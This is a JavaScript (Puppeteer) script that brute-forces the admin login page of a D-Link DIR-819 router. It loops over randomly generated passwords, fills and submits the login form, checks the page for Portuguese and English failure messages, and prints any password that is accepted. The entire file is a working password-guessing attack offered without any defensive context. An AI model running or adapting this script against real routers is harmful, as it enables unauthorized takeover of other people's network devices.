const puppeteer = require('puppeteer');

console.log('bruteForce for router DIR-819');



async function bruteforce() {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();
  const url= `http://192.168.0.1/cgi-bin/webproc`;
  
  var result;
  var loop = true;

  while(loop){
        var password = getPassword();
        await page.goto(url);
        //write in the input
        await page.waitForSelector('#INPUT_Psd');  
        await page.evaluate((password) => {
            document.querySelector('#INPUT_Psd').value = password;
            document.querySelector('#submit').click();
        }, password);
        
        //wait for information
        await page.waitForSelector("#tologin");
        result = await page.evaluate(() => {
            return document.body.innerText;
        });

        //compare the information
        if(!result.includes("O nome de usuário ou a senha estão incorretos.") && !result.includes("400 Bad Request") && !result.includes("Iniciar sessão no router:") && !result.includes("Log in to the router :")){
            console.log("PASSWORD ACCEPT: ");
            console.log(password);
            loop = false;
            break;
        }else{
            console.log("Password Wrong: " + password);
        }

    }

}

//generate a random password 
function getPassword() {
    var chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJLMNOPQRSTUVWXYZ!@#$%&?"; //()+><:{}[]*^
    
    var passwordLength = getRandomArbitrary(6, 15);
    var password = "";

    for (var i = 0; i < passwordLength; i++) {
      var randomNumber = Math.floor(Math.random() * chars.length);
      password += chars.substring(randomNumber, randomNumber + 1);
    }
    return password;
}

//generate a random number
function getRandomArbitrary(min, max) {
    return Math.random() * (max - min) + min;
  }

bruteforce();